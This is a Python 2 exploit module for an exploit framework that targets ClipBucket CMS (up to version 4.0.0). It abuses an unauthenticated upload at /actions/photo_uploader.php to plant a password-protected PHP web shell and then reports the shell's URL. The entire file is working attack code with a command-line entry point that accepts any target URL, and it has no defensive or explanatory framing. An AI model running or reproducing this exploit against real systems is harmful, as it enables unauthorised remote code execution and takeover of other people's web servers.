#coding: utf-8

import os
import sys
import datetime
import re
import json
from exp_template import Exploit, Level, session, get_random_password

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class clipbucket_fileupload_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'clipbucket_fileupload_getshell',
            'author': 'h',
            'date': '2018-03-07',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'ClipBucket',
            'min_version': '',
            'max_version': '4.0.0',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'ClipBucket文件上传GetShell',
            'reference':'',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
    	data={
            'plupload':'1',
            'name':'test.php',
            'submit':'submit'
            }
        randpass = get_random_password()
        shell = {'file':('%s.txt'%get_random_password(), open("shell/shell02.php",'rb').read().replace('__RANDPASS__', randpass))}
        url = self.url+"/actions/photo_uploader.php"
        req = session()
        
        try:
            r=req.post(url=url, data=data, files=shell)
        except:
            self.report('目标连接失败', Level.error)
            return        
        try:
            result = json.loads(r.text)
            shell = '%s/files/photos/%s/%s.php' % (self.url, result['file_directory'], result['file_name'])
            #print shell, randpass
            self.shell_info(shell, randpass, 'php')
        except Exception as e:
            print e
            pass
        
if __name__ == "__main__":
    # url = 'http://localhost:84/clipbucket-2.8.1/upload/'
    # a = clipbucket_fileupload_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = clipbucket_fileupload_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

